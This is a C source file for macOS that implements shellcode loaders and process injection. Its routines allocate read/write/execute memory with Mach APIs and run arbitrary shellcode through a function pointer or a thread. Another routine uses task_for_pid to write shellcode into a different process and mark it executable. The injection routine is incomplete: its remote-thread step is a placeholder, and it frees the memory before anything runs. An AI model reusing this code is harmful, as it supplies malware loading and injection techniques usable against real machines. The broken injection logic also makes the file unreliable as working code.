#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <pthread.h>

// macOS-specific memory operations
void* allocate_executable_memory_macos(size_t size) {
    vm_address_t address = 0;
    kern_return_t result = vm_allocate(mach_task_self(), 
                                      &address, 
                                      size, 
                                      VM_FLAGS_ANYWHERE);
    
    if (result != KERN_SUCCESS) {
        return NULL;
    }
    
    // Set memory protection to read/write/execute
    result = vm_protect(mach_task_self(), address, size, FALSE, 
                       VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
    
    if (result != KERN_SUCCESS) {
        vm_deallocate(mach_task_self(), address, size);
        return NULL;
    }
    
    return (void*)address;
}

// Shellcode execution with Mach APIs
int execute_shellcode_macos(unsigned char* shellcode, size_t size) {
    void* exec_mem = allocate_executable_memory_macos(size);
    if (!exec_mem) {
        return -1;
    }
    
    // Copy shellcode
    memcpy(exec_mem, shellcode, size);
    
    // Execute via function pointer
    int (*func)() = (int(*)())exec_mem;
    int result = func();
    
    // Cleanup
    vm_deallocate(mach_task_self(), (vm_address_t)exec_mem, size);
    
    return result;
}

// Thread creation for code execution
int execute_in_thread(unsigned char* shellcode, size_t size) {
    void* exec_mem = allocate_executable_memory_macos(size);
    if (!exec_mem) {
        return -1;
    }
    
    memcpy(exec_mem, shellcode, size);
    
    pthread_t thread;
    int result = pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);
    
    if (result == 0) {
        pthread_join(thread, NULL);
    }
    
    vm_deallocate(mach_task_self(), (vm_address_t)exec_mem, size);
    return result;
}

// Process injection via task_for_pid
int inject_into_process_macos(pid_t pid, unsigned char* shellcode, size_t size) {
    task_t target_task;
    kern_return_t result = task_for_pid(mach_task_self(), pid, &target_task);
    
    if (result != KERN_SUCCESS) {
        return -1;
    }
    
    mach_vm_address_t remote_address = 0;
    result = mach_vm_allocate(target_task, &remote_address, size, VM_FLAGS_ANYWHERE);
    
    if (result != KERN_SUCCESS) {
        return -1;
    }
    
    // Write shellcode to remote process
    result = mach_vm_write(target_task, remote_address, (vm_offset_t)shellcode, size);
    
    if (result != KERN_SUCCESS) {
        mach_vm_deallocate(target_task, remote_address, size);
        return -1;
    }
    
    // Set execution permissions
    result = mach_vm_protect(target_task, remote_address, size, FALSE, 
                            VM_PROT_READ | VM_PROT_EXECUTE);
    
    if (result != KERN_SUCCESS) {
        mach_vm_deallocate(target_task, remote_address, size);
        return -1;
    }
    
    // Create remote thread (simplified)
    mach_vm_deallocate(target_task, remote_address, size);
    return 0;
}